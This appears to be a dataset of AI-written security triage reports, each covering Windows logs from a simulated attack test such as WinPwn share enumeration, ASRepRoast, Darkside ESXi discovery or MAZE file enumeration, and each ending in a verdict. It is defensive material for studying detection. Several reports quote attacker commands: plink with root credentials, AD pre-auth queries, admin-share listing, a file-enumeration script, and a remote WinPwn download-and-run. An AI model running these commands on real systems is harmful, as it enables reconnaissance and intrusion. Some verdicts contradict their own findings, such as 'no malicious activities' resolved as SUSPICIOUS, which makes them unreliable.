   - Conduct a risk assessment regarding the exposure of open ports identified by the script and ensure proper network hardening and segmentation.
   - Capture and analyze potential threats by expanding log monitoring, especially for security logs that are currently empty.
   - Cross-check running services and processes for deviations from baseline behavior, particularly any that stem from high privilege accounts.
  
3. **Proactive Measures:**
   - Restrict PowerShell use through Group Policy unless directly needed for administrative tasks.
   - Strengthen training for users with elevated permissions regarding acceptable network behavior and potential threats.
   - Implement alerts on pattern detections that align with the activities noted in this report."
ESXi - Darkside system information discovery,"Upon analysis of the provided logs, let's highlight and assess the suspicious behaviors detected:

1. **Unusual Command-Line and Program Execution:**

   - The Sysmon log containing the entry:
     - `C:\Windows\System32\cmd.exe /c echo """" | ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\plink.exe"" ""file.local"" -ssh -l ""root"" -pw ""pass"" -m ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\esx_darkside_discovery.txt""`
     - This indicates the use of `plink.exe` with plaintext credentials, which is highly indicative of unauthorized and potentially malicious activity. The usage of `cmd.exe` to execute a script with such explicit credentials suggests an external tool is being used to connect to another system using SSH.

2. **Use of Plink.exe:**

   - `Plink.exe` is part of the PuTTY suite and is a command-line connection tool, often used by attackers to maintain remote access. Its usage here to connect as 'root' with plaintext password further raises a red flag.

3. **Normal System Operations:**

   - While there are a number of legitimate Windows processes and updates (e.g., Microsoft Edge Update) recorded in the logs, these are expected system activities and do not raise any flags in isolation. They appear within the regular operation scope of Windows updates and background tasks.

4. **Security Log Insights:**

   - There are multiple logon events with ""Event ID: 4624"" and privilege assignments with ""Event ID: 4672"". These log events logon activities related to the SYSTEM account — normal considering system service operations.
   - However, no other explicit indicators of privilege escalation or abnormal logon patterns were detected in the security logs.

**Assessment:**

Based on the logs provided, the activity involving `plink.exe` stands out as potentially malicious. The plaintext password and root login attempt are strong indicators of unauthorized access activity. Although there are benign activities noted within the logs, this particular behavior necessitates further investigation to ascertain intent, scope, and impact.

**Resolution: SUSPICIOUS**

**Guidance on Next Steps:**

1. **Immediate Review:**
   - Investigate the source of the `plink.exe` execution and check the integrity and author of the script used.
   - Validate the presence and purpose of `esx_darkside_discovery.txt` and any associated scripts.

2. **Access Logs:**
   - Review firewall, SSH, and other network logs for external connections that match the timeline of these events.
   
3. **Containment:**
   - If unauthorized access is confirmed, contain and isolate affected systems to prevent lateral movement or further data exfiltration.

4. **Security Measures:**
   - Consider implementing network security measures to monitor plaintext password usage.
   - Strengthen logging and monitoring for early detection of similar activities in the future.

5. **Further Investigation:**
   - Perform a thorough review of the environment for other instances of suspicious activities or potential compromise.

By following these steps, a clearer understanding of the organization's network security posture can be established, and appropriate action can be taken to mitigate the identified risks."
PowerShell Network Sniffing,"During the examination of the provided Windows event logs, several events and behaviors have been noted, which might suggest suspicious activities. Here's a detailed analysis of the logs:

### Key Observations:

1. **Frequent Execution of `wevtutil.exe`:**
   - The `wevtutil.exe` process was observed multiple times within a very short time span. This utility is typically used to manage event logs, and frequent invocation, especially under a user account, can be unusual and might indicate attempts to manipulate or clear event logs to hide activities.

2. **Powershell Execution:**
   - There is evidence of a PowerShell script execution that creates, starts, stops, and removes a network event capture session using `New-NetEventSession`. The command captures network traffic and writes to a temporary file (`sniff.etl`). This behavior is often associated with malicious actors trying to capture network traffic to exfiltrate data or sniff credentials.

3. **High Integrity and Privileged Processes:**
   - Multiple processes (`whoami.exe`, `conhost.exe`, `hostname.exe`) were run under high integrity levels by the user `SERVER002\admin_test`. Although these are standard Windows utilities, their execution under high integrity might be indicative of privilege escalation or an administrative script running checks.

4. **Security Log Events:**
   - There are logs indicating a change in system time. Event 4616 logs indicate changes in time, which could be an attempt to obfuscate log times or revert system time for some application-specific backdating purposes.

5. **Suspicious Privileged Operations:**
   - There are several instances with EventID 4672 involving the assignment of special privileges, such as `SeDebugPrivilege`, which is highly suspicious and indicative of possible privilege escalation attempts.

6. **Service and System Process Executions:**
   - `svchost.exe` and `wbem\WmiPrvSE.exe` processes showed up in the logs but were operating under typical system accounts like `NT AUTHORITY\SYSTEM` and seem to be legitimate system services.

### Assessment:

The presence of multiple instances of `wevtutil.exe`, PowerShell network events capture, and the altering of system time are indicators of potentially malicious activities. While the `admin_test` account performed actions that a system administrator may conduct, the combination of actions suggests attempts to hide activity or prepare for lateral movement.

### Conclusion:

Based on the analysis, the logs are categorized as **SUSPICIOUS**. There appears to be activity that doesn’t look right, primarily due to the repeated log management command, unusual network packet capturing, and the changes to system time, which collectively require further investigation to rule out potential compromise completely.

### Recommendations:

1. **Further Investigation:**
   - Conduct a detailed review of the `admin_test` user's recent activities and access logs.
   - Verify if the PowerShell scripts are known and approved by the system administration.

2. **Threat Hunting:**
   - Check for any unauthorized changes to system policies or executable binaries.
   - Monitor network traffic for evidence of data exfiltration.

3. **Suggested Security Measures:**
   - Enable strict auditing policies to capture a broader spectrum of log activities.
   - Review and restrict privilege assignments, especially `SeDebugPrivilege`.

Overall, the activities indicate a need for deeper inspection and this situation should be handled with caution."
Find and Display Internet Explorer Browser Version,"After conducting a thorough analysis of the provided Windows event logs, here are the findings:

### Detailed Analysis:

1. **Sysmon Log:**
   - The execution of `wevtutil.exe` and `conhost.exe` in rapid succession by the `admin_test` user is evident throughout the logs. `wevtutil.exe` is a legitimate Windows utility for managing event logs and should be monitored if used unusually.
   - The presence of normal administrative utilities like `hostname.exe` and `whoami.exe` indicates that user `admin_test` is running commands typical for an administrative user. These utilities are commonly used for gathering system information.
   - PowerShell activity and command usage that may indicate changes to system settings or suspicious file operations were not detected in this segment of the logs.
   - Usage of `cmd.exe` to execute a registry query using `reg.exe`. The command is querying the version of Internet Explorer via the registry. While the command itself isn't inherently malicious, its context and purpose should be confirmed with the user or administrative actions.

2. **System Log:**
   - No unusual system events were recorded. Regular time service events and time adjustments appear normal and expected due to system time synchronization.

3. **Security Log:**
   - Event ID `4616` indicates changes in the system time, associated with the `LOCAL SERVICE`. It corresponds with system synchronization events and seems legitimate.

### Assessment:
- **Benign Activities:**
  - Multiple events can be attributed to a legitimate administrative user (`admin_test`) performing tasks that involve querying system information and managing logs.
  - System time changes are from standard time synchronization processes.

- **Potentially Suspicious Activity:**
  - The usage of `wevtutil.exe` could be part of a legitimate task, such as log maintenance. However, frequent and repeated usage may be suspect if not part of known administrative changes or tasks. Context around these operations is essential to determine the legitimacy.

- **No Malicious Activities Detected:**
  - There are no clear signs of malicious activity such as privilege escalations, unexpected command executions, or programs running from unusual locations.

### Resolution:
- **SUSPICIOUS**: The activities logged are likely part of legitimate administrative actions. However, due to the frequent use of `wevtutil.exe` by the `admin_test` user and the registry query executed, further verification is necessary. Confirm whether these actions align with user-reported activities or scheduled administrative tasks. If not, additional investigation should be conducted to rule out potential misuse of administrative access."
System Time with Windows time Command,"### Detailed Analysis of Logs

#### Security Log:

1. **EventID 4616** - This is a system time change event. There are two events suggesting a minor adjustment in system time, which is an expected behavior during time synchronization with network time protocol. It is executed under the `LOCAL SERVICE` account using the `svchost.exe` process, which is typical of time synchronization processes.

2. **EventID 4672** - This event indicates the assignment of special privileges to a user. The `admin_test` user is assigned several advanced privileges including `SeDebugPrivilege`, which can be a red flag if not expected. These privileges allow significant system-level operations, which could be exploited if possessed by a malicious actor. However, there's no immediate indication these privileges were used maliciously.

3. **EventID 4624** - Represents a successful logon event. The `admin_test` user logged in remotely via `NTLM` authentication from the workstation `DESKTOP-3HL5B2P`. This action could be normal if `admin_test` regularly accesses the server, but it raises suspicion if unexpected, especially without knowledge of this user's typical behavior.

#### System Log:

System logs indicate normal operations related to time synchronization and the trust level set for time servers. No suspicious activity is detected in the system log.

#### Sysmon Log:

1. **EventID 5 and EventID 1** - Several entries detail process creations involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and usage of command-line interfaces (`cmd.exe`, `whoami.exe`). These may relate to administrative tasks or scripts executing commands, yet their prominence demands attention:
   - Frequent invocation of `wevtutil.exe` suggests potential log manipulation or event query activity, potentially by the `admin_test` user, which raises suspicion if unjustified.

2. **EdgeUpdate Activity** - Multiple entries note the `MicrosoftEdgeUpdate.exe` processes, which align with expected software update behavior. These entries correspond to normal updates conducted by the `Microsoft` Edge Update service.

3. **Unexpected Process Execution** - The execution of `cmd.exe` with a `/c time` command indicates automated or remote script execution. It's not inherently malicious but could deserve further review depending on broader context.

#### Application Log:

Normal behavior of stopping `edgeupdate` services and routine messages indicate no anomaly or direct threat.

### Assessment and Resolution:

1. **Potential Risks**:
   - Elevated privileges for `admin_test`.
   - Remote logon activity by `admin_test` using `NTLM` from a new or unknown workstation.
   - Frequent execution of `wevtutil.exe` which could imply log tampering or reconnaissance.

2. **Suspicious Aspects**:
   - Elevated privileges combined with remote logon hints at potential preparatory steps for lateral movement or privilege escalation.
   - `admin_test` activities, including execution of system utilities, albeit legitimate, should be justified and documented to ensure compliance with security policies.

### Resolution: **SUSPICIOUS**

The activities logged are bordering on suspicious due to the elevated privileges and remote access by the `admin_test` user. While the processes executed are not unconventional for a user with administrative rights, the consistency and manner of their occurrence recommends a deeper investigation. 

**Guidance on How to Proceed**:
- Verify the legitimacy of `admin_test` activities, especially the context and necessity of privilege escalations.
- Correlate this information with network logs to detect any lateral movement attempts.
- Conduct interviews or reviews with the system owners or the `admin_test` user to substantiate the actions logged.
- Consider additional monitoring and audit logging of privileged operations and remote access attempts."
Network Share Discovery via dir command,"### Analysis of Logs:

Upon analyzing the provided Sysmon logs, several points stand out concerning the activities conducted by an account, `SERVER002\\admin_test`, and processes running under `NT AUTHORITY\\SYSTEM`. 

1. **Usage of Wevtutil.exe**: 
   - Multiple instances of the process `wevtutil.exe` are invoked by the user `SERVER002\\admin_test`, which is a command-line utility that enables the user to retrieve information about event logs and publishers. While `wevtutil.exe` is a legitimate utility within Windows, its atypical use could indicate an attempt to exfiltrate logs or tamper with them. Security professionals often regard excessive or unusual use of this tool as suspicious, especially when used by accounts not ordinarily involved in system administration tasks.

2. **Command-Line Usage**:
   - There is an execution of `cmd.exe` with commands to list shared directories on the host (`cmd.exe /c dir \\\\127.0.0.1\\c$ & dir \\\\127.0.0.1\\admin$ & dir \\\\127.0.0.1\\IPC$`). This command could be indicative of an attacker attempting to enumerate shared directories or drives, suggesting reconnaissance steps in lateral movement efforts.

3. **Running as SYSTEM**:
   - There are numerous instances of `MicrosoftEdgeUpdate.exe` being executed under `NT AUTHORITY\\SYSTEM`. While this can be typical for system updates, the context and frequency warrant caution. Multiple processes are triggered in quick succession, and their paths sometimes lead to temporary directories, which could suggest manipulation or an update mechanism being used as a vector for persistence or privilege escalation.

4. **Whoami.exe Execution**:
   - The repeated execution of `whoami.exe` by `SERVER002\\admin_test` could be regarded as a method to query about the user's current privileges. While this is a benign command generally, its purpose within this context needs to be correlated with known activities of this user and expected behavior in the environment.

### Assessment:

Given the observations, the activity observed does not outright confirm malicious intent but suggests actions typically associated with reconnaissance or potential compromise. The combination of using system utilities like `wevtutil.exe`, network enumeration through `cmd.exe`, and the multiple edge update processes bear hallmarks of unusual activity that is more indicative of an advanced threat actor's tradecraft than benign routine operations.

### Resolution:

**Resolution**: **SUSPICIOUS**

While the actions described may have legitimate explanations, particularly if this was during a time of system maintenance or update, they collectively raise enough red flags to merit deeper investigation. We recommend correlating this activity with network monitoring data, conducting a thorough investigation on user `SERVER002\\admin_test` activities around this timeframe, and checking for any corresponding alerts from other security monitoring solutions that might indicate correlated concerns or false positives.

### Guidance on Next Steps:

1. **Review User Actions**: Investigate the past activities of `SERVER002\\admin_test` to confirm whether this behavior aligns with previous actions and responsibilities.
2. **Check Other Systems and Logs**: Look for patterns or similar activities on other systems that might correlate with potential lateral movement or broader malicious campaign.
3. **Alert Monitoring Solutions**: Confirm if there are alerts from other security solutions (IDS/IPS, SIEM) triggered by these activities to ascertain broader context.
4. **Conduct Forensic Review**: Analyze endpoints for any suspicious artifacts or anomalies in system files, user directories, and registry changes.
5. **Enhanced Logging and Alerts**: Increase logging verbosity for user actions, particularly involving process execution, access to network shares, and SYSTEM-level operations.
6. **Educate and Harden**: Revisit access control policies, ensure user roles are clearly defined, and make users aware of security policies and incidents."
WinPwn - shareenumeration,"Upon reviewing the provided Windows event logs, I've conducted a detailed analysis of the activities recorded across the different logs: System, Application, Windows PowerShell, Sysmon, and Security.

### Key Findings:

1. **Windows PowerShell Log:**
   - **Suspicious Activity:** There is a PowerShell script execution logged, which downloads and executes a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). Tools like WinPwn are often associated with security auditing or testing frameworks, but their use in an unauthorized manner can indicate a potential security issue.
   - **Command Executed:** It includes downloading a script and invoking it with execution policy bypasses which is a common technique used by attackers.

2. **Sysmon Log:**
   - Multiple instances of the Edge Update processes are recorded. While frequent updates are often benign, the repeated execution and use of temporary directories (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUFB2F.tmp\\`) suggests that further investigation is needed to ensure this isn’t being misused for execution of unauthorized binaries.
   - The presence of `wevtutil.exe` and `whoami.exe` executed under administrative contexts by the `SERVER002\admin_test` user could be entirely normal, but are noteworthy as they could indicate enumeration actions often seen in lateral movement.

3. **Security and System Logs:**
   - The time change events are seen, which are part of routine operations and don't suggest any tampering or anomalies indicative of malicious behavior.
   - Updates and Defender activities appear standard and don't immediately suggest malicious activities.

### Assessment:
- **Graffiti across logs:** The PowerShell activity specifically stands out as probably the most compelling potentially malicious indicator because of direct script invocation from an external source, often a red flag in controlled corporate environments.

- **Overall Patterns:** Although frequent creations and updates of Edge Update instances piqued curiosity, further context of known software behaviors would be required to confidently mark these as malicious. Routine log queries regarding executed processes (e.g., whoami, conhost) were benign in isolation but could suggest elevated risk if coupled with the suspicious PowerShell activities.

### Recommendation:
Due to the detected unusual use of PowerShell to download a script from a potentially unauthorized source, this behavior is classified as **SUSPICIOUS**. It requires:
1. **Further Investigation:** Examine network traffic and endpoints for data leaving the corporate network suspiciously.
2. **Audit user actions:** Particularly those of `SERVER002\admin_test`, to ensure they are consistent with authorized activities.
3. **Restrict Execution Policies:** Lock down PowerShell execution policies further to restrict Unauthorized script execution.
4. **Review GitHub access:** Ensure any such repositories are vetted and properly authorized for use within the network.

The resolution for the investigation based on the observed events is ""SUSPICIOUS."" Further investigation is warranted to rule out any real threats or to understand the context behind these actions."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"### Detailed Analysis

1. **Sysmon Log Analysis**:
   - **PowerShell Activity**:
     - Multiple instances of `powershell.exe` are observed, executed by the user `SERVER002\admin_test`. A specific PowerShell command: `get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}` is present. This command filters Active Directory users for the attribute `DoesNotRequirePreAuth`, which could be a reconnaissance activity used often in pre-attacks to identify potential targets for kerberoasting or other attacks against user accounts.
   - **Wevtutil Activity**:
     - `wevtutil.exe` is executed several times by `SERVER002\admin_test`. This utility is used for exporting or clearing event logs, and while not inherently malicious, its usage in conjunction with other suspicious commands may indicate log clearing activities aimed at evading detection.
   - **Conhost Activity**:
     - Several instances of `conhost.exe` are noted as parent processes, which by itself is standard when dealing with command-line executions but can support suspicious activity when associated with other atypical events.
   - **Whoami and Hostname Commands**:
     - Execution of `whoami.exe` and `hostname.exe`, while regular for system checks, are often part of scripted actions to verify permissions or environment during an attack.

2. **PowerShell Log Analysis**:
   - The PowerShell logs indicate several providers starting, suggesting the execution of PowerShell scripts or commands, corroborating with the Sysmon logs execution of PowerShell commands indicating potential scripting or automation.
   - The specific command executed (`get-aduser ...`) mirrors the Sysmon logs, highlighting a focus on querying Active Directory, possibly for reconnaissance efforts.

3. **Security and System Log Analysis**:
   - These logs are not provided. Therefore, direct actions related to security auditing or system changes are not ascertained but would be critical to understanding any illegitimate privilege escalation or account manipulation attempts.

### Assessment

- **Suspicious Behavior**:
  - The use of PowerShell to filter Active Directory user accounts for attributes that do not require pre-authentication is a known reconnaissance technique used by attackers to identify accounts that might be leveraged for further malicious activity such as Kerberoasting.
  - Frequent execution of `wevtutil.exe`, possibly indicating attempts to manage event logs in a way that could obscure traces of malicious activity.

### Guidance and Resolution

- **Resolution**: **SUSPICIOUS**
  - The activities noted are suspicious due to their potential to be part of a reconnaissance and log-clearing phase in a cyber attack.
- **Recommendations**:
  - **Monitoring**: Increase monitoring on the user `SERVER002\admin_test`, particularly regarding Active Directory interactions and PowerShell activities.
  - **Log Review**: Examine security and system logs for any abnormal account changes or privilege escalations that might have been obfuscated.
  - **Threat Hunting**: Conduct threat-hunting exercises focusing on PowerShell activities and any modifications or clearance of logs.
  - **Access Control**: Review and restrict the use of high-integrity and administrative PowerShell and wevtutil commands, ensuring only necessary personnel have such access."
List Internet Explorer Bookmarks using the command prompt,"Upon analyzing the provided Windows event logs, here's a detailed assessment:

### System & Time-related Logs:
- Several events related to time synchronization occur in the logs, where ""svchost.exe"" under ""LOCAL SERVICE"" adjusts the system time slightly. These actions appear legitimate as they are typical for time synchronization through the Windows Time Service.

### Sysmon Logs:
- Multiple processes related to ""MicrosoftEdgeUpdate.exe"" are present. These processes are running under the ""NT AUTHORITY\SYSTEM"" user, indicating that they have high integrity and privileges. This aligns with typical behavior for system updates, particularly automatic updates for a browser like Microsoft Edge.
- However, the repeated execution of ""wevtutil.exe"" logging tool suggests log file manipulation or querying, which can be suspicious in certain contexts, but it might be part of legitimate activity like automated monitoring or logging tasks.
- The use of common command-line utilities, including ""cmd.exe"" invoked to list user profile directories and ""conhost.exe"", follows typical patterns seen in script or maintenance operations and is not inherently suspicious by itself.

### Application Logs:
- The entries showing the ""edgeupdate"" service starting and stopping do not raise immediate concerns. It can be associated with the installation or update of Microsoft Edge.

### Security Logs:
- The correlation of time change events also appears in the security logs. These records (Event ID 4616) do not show any signs of privilege misuse or unauthorized change attempts. They consistently originate from a trusted process, ""svchost.exe"".

### Assessment:
Overall, the event logs provided:
- Contain activities involving automatic updates for Microsoft Edge and exhibit no unusual patterns that suggest malware-like behavior. 
- Reflect normal Windows and application management activities, including time synchronization and potential Edge updates.
- The frequent execution of system utilities and services like ""wevtutil.exe"" and ""MicrosoftEdgeUpdate.exe"" under SYSTEM privileges is typical for maintaining system operations and software updates on Windows platforms.

### Conclusion:
Based on the logs analyzed, there are no clear indicators of compromise or confirmed malicious activities. However, because of the use of ""wevtutil.exe"" (associated with event log manipulation) and ""cmd.exe"", which could potentially be leveraged in malicious scripts, it would be prudent to monitor this system for any escalations.

**Resolution: BENIGN**

**Guidance:** Continue monitoring the system's logs to ensure these utilities aren't used in abnormal contexts, which could potentially signal malicious activity. Regular checks for unauthorized processes or unusual network activity can help maintain security integrity."
TruffleSnout - Listing AD Infrastructure,"Based on the provided logs, I have conducted a thorough analysis focusing on any indicators of malicious activity, including unusual process executions, suspicious command-line arguments, and potentially malicious files being invoked.

### Security and Application Logs:
- **Windows Defender**
  - Events indicate that Windows Defender is active (SECURITY_PRODUCT_STATE_ON), which suggests that the security solution is operational.

- **Software Protection Platform Service**
  - Regular events from this service without any unusual transactions or errors.

### Sysmon Logs:
- **Unusual Executables:**
  - A file named `TruffleSnout.exe` is observed being executed from the temp directory. The name and location are suspicious, as legitimate software usually runs from program folders, not temporary directories. Execution from a temporary folder can suggest that this executable is delivered as part of a malicious activity.

- **Command Line Activity:**
  - `cmd.exe` is used to execute `TruffleSnout.exe` with arguments like ""forest -n %userdomain%"" and ""domain -n %userdomain%"". These could be part of reconnaissance activities typically observed in penetration testing or malicious campaigns.

- **Process Execution Context:**
  - The user `SERVER002\admin_test` appears as the identity under which the suspicious processes are run. This indicates potential misuse or compromise of this user account.

- **Windows Management Instrumentation (WMI) Host Provider Process:**
  - `wsmprovhost.exe` as a parent process suggests possible automation or scripting contexts, which are sometimes leveraged in penetration testing or malicious scripts.

- **Use of Common Administrative Tools:**
  - `whoami.exe`, `hostname.exe`, and `wevtutil.exe` are observed. While these tools can be legitimate, in cybersecurity assessments, they can be indicative of activities aimed at gathering system, user, or log information from a compromised host.

### Conclusion:
The combination of command-line usage in the temporary folder, invocation of executables such as `TruffleSnout.exe`, and administrative tools in conjunction suggests behavior that is not typical for a regular user or system operation. These indicators align with potential reconnaissance or initial stages of compromise.

### Assessment:
- **Resolution: SUSPICIOUS**

### Recommendations:
1. **Further Investigation:**
   - Review the origin and purpose of the `TruffleSnout.exe` file. Determine its legitimacy and whether it matches known malicious signatures.
   - Examine user `SERVER002\admin_test`, including access patterns and any unauthorized permission elevations.
   
2. **Immediate Actions:**
   - Isolate the host for a deeper investigation to prevent any potential spread.
   - Review security advisories related to recent malware that exhibit similar patterns.

3. **Strengthen Security Measures:**
   - Increase monitoring of user behavior analytics and alerting for similar suspicious activities in the network.
   - Ensure all endpoint security solutions are updated.

By taking these steps, it should help determine if these logs represent benign activity related to authorized security tests or a legitimate compromise requiring remediation."
Query Registry with Powershell cmdlets,"Upon reviewing the provided Windows event logs from the Application, PowerShell, Sysmon, System, and Security channels, the following points and analysis are noted:

### 1. Application Log
- **Event ID 15** indicates that Windows Defender is active and running on the system. This is a standard log entry showing that the security product is in a healthy state.

### 2. PowerShell Log
- The PowerShell logs contain several event IDs (600 and 400 series) that document the start of various PowerShell providers such as Registry, Alias, Environment, etc.
- There is a significant PowerShell command being executed that queries multiple registry paths associated with system services, startup configurations, and user logon settings.
  - **Potential Indicators:**
    - The execution of commands querying sensitive registry keys can signify reconnaissance activities often associated with malicious behavior, particularly if conducted by unauthorized users.
    - This behavior can be typical for system audits or configuration management tasks but may be noteworthy if unexpected.

### 3. Sysmon Log
- The execution of legitimate system utilities like `whoami.exe`, `hostname.exe`, `findstr.exe`, and `wevtutil.exe` are observed. These could be used in legitimate administrative tasks or malicious actions (like system reconnaissance or log clearing).
- Processes related to system updates, such as `wuauclt.exe` (Windows Update) and `AM_Delta.exe` (antimalware update), show normal system maintenance activities.
- **Microsoft Edge Installer** processes are documented, which may indicate a browser update activity. This appears consistent with routine updates if scheduled maintenance wasn't a surprise.
- **Suspicious Indicators:**
  - Frequent command-line executions and process creations that arise quickly in succession can indicate automated scripts, possibly for reconnaissance.
  - No unauthorized or unsigned processes, nor any that are conspicuously malicious, were detected within these logs.

### 4. System Log
- The update and installation of security intelligence updates for Microsoft Defender are noted. These actions are typically part of routine patch management operations to ensure the system's defenses are up-to-date.

### 5. Security Log
- **Event ID 5379** indicates failed credential accesses related to a `MicrosoftAccount:user=02txoixylodcstop`. The failures and returns of the code `3221226021` suggest access denial, probably due to invalid authentication attempts or policy restrictions.
  - **Potential Concern:**
    - Repeated credential access attempts, if unexpected, may signal an attempted unauthorized access or misconfigured application/service attempting to authenticate.

### Assessment and Conclusion
- **General Assessment:**
  - While the majority of logs appear to be typical of routine administrative and update tasks, the concentration of PowerShell commands querying critical registry paths and the unsuccessful credential accesses raise concerns of possible unauthorized reconnaissance or misconfigurations.
  
- **Threats/Risks Identified:**
  - Possible reconnaissance activity using PowerShell commands, possibly indicative of pre-attack information gathering.
  - Repeated unsuccessful credential access may suggest either a potential operational issue or unauthorized access attempts.

### Guidance on Proceeding
- **Resolution: SUSPICIOUS**
  - Further investigation is necessary to confirm the intent and legitimacy of the PowerShell activity.
  - Examine contextual user activity surrounding these events, especially concerning the user `SERVER002\\admin_test` who ran the processes. Verify whether these actions align with expected user roles and responsibilities.
  - Investigate the reason for the repeated credential access failures to ensure no security policy violations or potential unauthorized access attempts are ongoing.

Consider implementing more granular logging (e.g., PowerShell script block logging) to gain better insight into repeated PowerShell script executions and monitor any escalation attempts related to credential or registry access."
System Information Discovery,"### Detailed Analysis:

#### 1. **Process Execution:**
   - **Commands and Utilities:**
     - Frequent usage of Windows utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `systeminfo.exe`, `cmd.exe`, and `reg.exe` is observed.
     - `reg.exe` is seen querying registry keys related to disk enumeration, which might suggest attempts to gather system information.

   - **Edge Update Processes:**
     - Numerous executions related to Microsoft Edge Update are documented, which include `MicrosoftEdgeUpdate.exe` and related setup and update processes. This is typical for automated updates of an application.

#### 2. **User Activity:**
   - The user `SERVER002\admin_test` is heavily involved in the execution of multiple processes, especially those related to system and network information gathering (e.g., `wevtutil.exe`, `systeminfo.exe`, `whoami.exe`).

#### 3. **Timezone Change:**
   - **EventID 4616 in Security Log**: This indicates a time change event where the system clock is adjusted backward. This could be indicative of an attempt to evade time-based monitoring systems or event log timestamps.

#### 4. **Sysmon and Security Logs:**
   - **EventID 5 in Sysmon**: Multiple entries involving common Windows binaries (`wevtutil.exe`, `conhost.exe`, etc.) without any further concerning command-line arguments. These are normal system activities unless proven otherwise by correlating with malicious intent.
   - **EventID 4634 in Security Log**: Logs off events for the `admin_test` user which are standard entries if correlated with log-in activities.

#### 5. **Indicators of Malicious Activity:**
   - Despite observing typical utility usage and system information gathering commands, and timezone changes, there aren't definitive indicators of known contemporary threats or malicious activity without context.
   - Many legitimate administrative or automated processes also require specific permissions and access, which could explain the observed behavior.

### Assessment:
- **Unusual Behavior**: The combination of process executions (especially information gathering) by a single user and the time change events can suggest benign administrative tasks or potential precursors of malicious behavior.
- **Edge Update Entries**: These are consistent with an automated software update, which is typical for maintaining software like Microsoft Edge.

### Final Resolution:
- **Resolution**: SUSPICIOUS
- **Reasoning**: Despite the activities being likely legitimate (such as administrative tasks or software updates), the back-and-forth time adjustments and extensive information gathering warrant further investigation to rule out the potential misuse of administrative privileges or a breach. Investigation into the `admin_test` activities, authentication sources, and intentions is advised.

### Guidance:
- **Investigate User Activity**: Verify the purpose and necessity of the commands executed by `SERVER002\admin_test`. Cross-reference with task schedules and administrative tasks.
- **Validate Time Change Reason**: Determine why the system time was altered and if it aligns with any legitimate operations or scheduled adjustments.
- **Network Analysis**: Look for any unusual traffic or data exfiltration attempts correlated with these activities, especially from the `admin_test` login sessions."
Simulating MAZE Directory Enumeration,"Upon reviewing the provided Windows event logs, I will analyze them to identify any suspicious or potentially malicious activities.

### Windows PowerShell Logs Analysis
The PowerShell logs indicate execution of a script that enumerates directories and files across user profiles and system paths. The command logs outputs to a temporary file located in the user’s temp directory. This can be seen as a file discovery activity, which is commonly associated with reconnaissance attempts by malicious actors. The executed script reads:

```powershell
$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming"")
Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\dataTest5.txt
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\dataTest5.txt
... 
cat $env:temp\dataTest5.txt
```

This should be considered suspicious as it involves enumeration of sensitive directories, often used by malware during the discovery phase.

### Security Logs Analysis
Security log entries are related to time changes and adjustments handled by svchost.exe, which is a normal operation in a Windows environment when synchronizing time, especially with services involving network time protocol (NTP).

### Application Logs Analysis
Application logs show normal activities, such as the stopping of services like edgeupdate, which might involve routine updates. This is considered benign.

### System Logs Analysis
The System logs reflect time synchronization activities showing interfacing with time servers, which are typical operations handled under standard circumstances without suspicious alterations to system parameters.

### Sysmon Logs Analysis
Sysmon logs show various executions, predominantly Microsoft Edge Update related processes like `MicrosoftEdgeUpdate.exe` indicating regular update checks or installations. These activities mostly originate from SYSTEM authority and appear routine. 

However, the execution of `powershell.exe` fits the same pattern as identified in the Windows PowerShell logs, reinforcing the suspicious nature of file enumeration operations.

### Summary and Resolution
The logs indicate that there has been an execution of a PowerShell script performing detailed file enumeration, which can potentially be a precursor to malicious activity, particularly considering it was written to a temp file that could be accessed or uploaded elsewhere by an attacker.

**Resolution: SUSPICIOUS**

**Recommendations to Proceed:**
1. Conduct further investigation into the origin of the PowerShell script to identify who executed it and why.
2. Review user activity logs around the timestamp of the suspicious activity for unauthorized access.
3. Monitor the system closely for further abnormal PowerShell executions or file activity.
4. Ensure that security patches are up-to-date and antivirus solutions are actively scanning for potential threats. 
5. Consider implementing increased logging and alerts on sensitive operations like PowerShell execution that involve file enumeration."
System Service Discovery,"Upon reviewing the given logs, here is a detailed analysis:

**System Log:**
- Windows Update Client events show normal updates for Microsoft Defender Antivirus. The targeted updates seem legitimate and are labeled as security intelligence updates, which commonly occur in enterprise environments for maintaining security posture. No anomalies detected here.

**Security Log:**
- The security log contains several EventID 5379 entries, indicating Credential Validation operation failures. The recurring return code `3221226021` correlates to a status of `STATUS_LOGON_SESSION_DOES_NOT_EXIST`. This suggests attempts to access or utilize credentials that could not be verified or did not belong to an active logon session. All these activities are carried out under `SERVER002$` which represents the computer account. While repeated credential validation failures can be suspicious, the events here could also stem from automated tasks or services misconfigured or unable to connect properly. Further context would be needed to assess their exact threat level but on their own here, no direct malicious intent is evident.

**Sysmon Log:**
- The logs contain normal and expected executions in a Windows environment, such as processes for `wbem\\WmiPrvSE.exe`, `System32\\wevtutil.exe`, `cmd.exe`, and utilities like `whoami`. There are also expected background processes such as MicrosoftEdgeUpdate.
- However, what's noteworthy is the `cmd.exe` execution with the command line `\""cmd.exe\"" /c tasklist.exe & sc query & sc query state= all`. This invocation appears to be scripting or batch-related, likely used for auditing or system monitoring of processes and services. This activity raises a flag for potential reconnaissance activity, but due to the common nature of such commands, their presence alone isn't definitively malicious without further suspicious context around them.
- The logs also show processes being executed by the user `SERVER002\\admin_test`. The ""admin_test"" user could be a testing or temporary admin account. Consistency in naming conventions should be considered, and if abnormal, it might warrant further investigation due to the elevated privileges of such accounts.

**Conclusion and Recommendation:**

- **Assessment:** The logs analyzed display some suspicious patterns, mainly surrounding repeated Windows Security Audit failures and a batch of command executions which can be interpreted as reconnaissance attempts. However, there is no definitive proof of malicious activities without additional context or correlated events suggesting an attack pattern or unauthorized access.

- **Resolution:** **SUSPICIOUS** 
